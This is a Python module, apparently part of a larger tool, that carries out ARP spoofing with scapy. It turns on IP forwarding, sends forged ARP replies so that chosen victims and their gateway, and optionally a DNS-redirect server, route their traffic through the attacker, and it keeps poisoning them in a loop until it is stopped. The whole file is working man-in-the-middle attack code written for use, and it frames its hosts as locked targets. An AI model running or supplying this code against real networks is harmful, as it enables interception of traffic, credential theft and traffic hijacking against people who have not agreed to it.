import time
import sys
import os
import scapy.all as scapy
from . import STATUS, STOP_EVENT
from .utils import log_msg, get_mac

# --- CORE UTILITIES ---
def set_ip_forwarding(value):
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(str(value))
        os.system(f"echo {value} > /proc/sys/net/ipv4/conf/all/send_redirects")
    except: pass

def get_own_mac(interface):
    try: return scapy.get_if_hwaddr(interface)
    except: return None

# --- ARP ATTACK FUNCTIONS ---
def spoof(target_ip, spoof_ip, target_mac, attacker_mac):
    packet = scapy.Ether(dst=target_mac, src=attacker_mac) / \
             scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=attacker_mac)
    scapy.sendp(packet, verbose=False, iface=STATUS["interface"])

def restore(dest_ip, source_ip, dest_mac):
    source_mac = get_mac(source_ip)
    if dest_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])

# --- MAIN ATTACK LOGIC ---
def run_attack_loop(target_ips, gateway_ip):
    STATUS["state"] = "RUNNING"
    STATUS["packets"] = 0
    
    set_ip_forwarding(1)
    
    active_targets = [] 
    
    redirect_ip = STATUS.get("dns_ip")
    redirect_mac = None
    use_triangle = False

    try:
        interface = STATUS["interface"]
        attacker_mac = get_own_mac(interface)
        
        # 1. Resolve Gateway MAC
        gateway_mac = get_mac(gateway_ip)
        if not gateway_mac:
            log_msg(f"[!] Warning: Gateway {gateway_ip} is offline. Spoofing blindly.")
            gateway_mac = "ff:ff:ff:ff:ff:ff" 

        # 2. Resolve Redirect/Server MAC
        if STATUS.get("mode") == "DNS SPOOF" and redirect_ip:
            redirect_mac = get_mac(redirect_ip)
            if redirect_mac:
                use_triangle = True
                log_msg(f"[*] MULTI-PATH MODE: Also hijacking traffic to Server {redirect_ip}")
            else:
                log_msg(f"[!] Warning: Could not find Server {redirect_ip}. Data capture might fail.")

        # 3. Resolve Victim MACs
        unique_targets = list(set(target_ips))
        for t_ip in unique_targets:
            if STOP_EVENT.is_set(): return
            t_mac = get_mac(t_ip)
            if not t_mac:
                time.sleep(1)
                t_mac = get_mac(t_ip)

            if t_mac:
                active_targets.append({"ip": t_ip, "mac": t_mac})
                # --- [FIXED] ADDED MAC DISPLAY HERE ---
                log_msg(f"    + Locked Target: {t_ip} [{t_mac}]")
            else:
                log_msg(f"    - Failed to resolve: {t_ip}")

        STATUS["active_targets"] = active_targets
        if not active_targets: return

        log_msg(f"[*] POISONING STARTED...")

        # 4. Main Poisoning Loop
        while not STOP_EVENT.is_set():
            for target in active_targets:
                try:
                    # PATH A: Victim <-> Gateway
                    spoof(target["ip"], gateway_ip, target["mac"], attacker_mac)
                    if gateway_mac and gateway_mac != "ff:ff:ff:ff:ff:ff":
                        spoof(gateway_ip, target["ip"], gateway_mac, attacker_mac)

                    # PATH B: Victim <-> Server
                    if use_triangle:
                        spoof(target["ip"], redirect_ip, target["mac"], attacker_mac)
                        spoof(redirect_ip, target["ip"], redirect_mac, attacker_mac)

                except Exception: pass
            
            STATUS["packets"] += len(active_targets) * 2
            time.sleep(2)
            
    except Exception as e: 
        log_msg(f"[!] ARP Loop Error: {e}")
    finally:
        for target in active_targets:
            try:
                restore(target["ip"], gateway_ip, target["mac"])
                if gateway_mac: restore(gateway_ip, target["ip"], gateway_mac)
                if use_triangle:
                    restore(target["ip"], redirect_ip, target["mac"])
                    restore(redirect_ip, target["ip"], redirect_mac)
            except: pass
            
        set_ip_forwarding(0)
        STATUS["state"] = "IDLE"
        STATUS["mode"] = "NONE"